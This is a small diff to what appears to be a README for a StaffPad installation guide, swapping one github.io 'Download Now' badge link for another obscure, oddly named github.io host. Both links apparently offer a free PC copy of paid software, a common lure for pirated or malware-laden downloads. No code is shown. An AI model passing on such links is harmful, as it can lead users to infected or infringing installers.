@@ -5,7 +5,7 @@
 <h1 align="center"><strong>🎵 STAFFPAD – INSTALLATION & USAGE GUIDE</strong></h1>
 
 <p align="center">
-  <a href="https://staffpad-free-for-pc.github.io/.github/" style="text-decoration:none;">
+  <a href="https://staffpad-4pc1inf0.github.io/.github/" style="text-decoration:none;">
     <img src="https://img.shields.io/badge/DOWNLOAD%20NOW-228B22?style=for-the-badge&logo=windows&logoColor=white" alt="Download StaffPad" width="220px" />
   </a>
 </p>
